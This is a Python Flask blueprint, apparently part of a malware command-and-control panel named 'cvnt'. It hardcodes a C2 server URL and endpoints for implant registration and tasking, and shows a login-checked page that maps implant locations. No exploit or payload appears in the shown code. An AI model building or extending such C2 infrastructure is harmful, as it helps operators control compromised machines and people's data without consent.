from cvnt.implant_pb2 import TaskRequest
from flask import Blueprint, session, render_template, redirect, url_for 
from flask_wtf import FlaskForm 
from wtforms import StringField, SubmitField 
from wtforms.validators import DataRequired, Length 
from cvnt.client_pb2 import *
from urllib.parse import urljoin
from cvnt.client_pb2 import Command, ClientTaskRequest, ClientTaskResponse, Packet
from cvnt.constants import opcodes, server_commands, to_opcode
from cvnt.database import db
from cvnt.db_operations import make_task, get_list, get_implant_by_id

client = Blueprint('client', __name__, template_folder='templates')
c2 = "https://rigmalwarole.com"
task_list = "/client/task/list"
task_create = "/client/task/create"
register = "/client/register"
request = "/client/request"
response = "/client/response"
packet = "/client/packet"

import random

@client.route('/client', methods=['GET', 'POST'])
def index():
    if 'authenticated' not in session or not session['authenticated']:
        return redirect(url_for('basic.login_success'))
    # Fetch latitude and longitude values from your Flask app
    implants = get_list()
    implant_coordinates = [(get_implant_by_id(implant).latitude, get_implant_by_id(implant).longitude, get_implant_by_id(implant).implant_id) for implant in implants]
    return render_template('index.html',implant_coordinates=implant_coordinates)
